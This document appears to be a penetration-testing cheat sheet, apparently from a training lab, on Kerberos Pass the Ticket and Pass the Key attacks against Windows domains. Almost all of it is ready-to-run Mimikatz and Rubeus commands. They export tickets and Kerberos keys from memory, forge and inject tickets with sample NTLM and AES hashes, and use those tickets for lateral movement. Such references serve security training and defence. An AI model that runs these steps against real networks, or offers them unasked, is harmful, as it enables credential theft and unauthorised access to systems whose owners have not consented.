## Kerberos protocol refresher

- The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.
## Pass the Ticket (PtT) attack

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:

- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
## Harvesting Kerberos tickets from Windows
#### Mimikatz - Export tickets

```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK mimikatz # 

sekurlsa::tickets /export

mimikatz # exit
```
#### Rubeus - Export tickets

```cmd
c:\tools> Rubeus.exe dump /nowrap
```

**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
## Pass the Key aka. OverPass the Hash
#### Mimikatz - Extract Kerberos keys

```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # sekurlsa::ekeys
```
#### Mimikatz - Pass the Key aka. OverPass the Hash

```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
#### Rubeus - Pass the Key aka. OverPass the Hash

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
## Pass the Ticket (PtT)
#### Rubeus - Pass the Ticket

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
#### Convert .kirbi to Base64 Format

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
#### Pass the Ticket - Base64 Format

```cmd
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```
#### Mimikatz - Pass the Ticket

```cmd
C:\tools> mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK 

mimikatz # exit 
Bye!
```
## Pass The Ticket with PowerShell Remoting (Windows)
## Mimikatz - PowerShell Remoting with Pass the Ticket
#### Mimikatz - Pass the Ticket for lateral movement.

```cmd
C:\tools> mimikatz.exe

mimikatz # privilege::debug 
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK 

mimikatz # exit 
Bye!
```
## Rubeus - PowerShell Remoting with Pass the Ticket
#### Create a sacrificial process with Rubeus

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
#### Rubeus - Pass the Ticket for lateral movement

```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

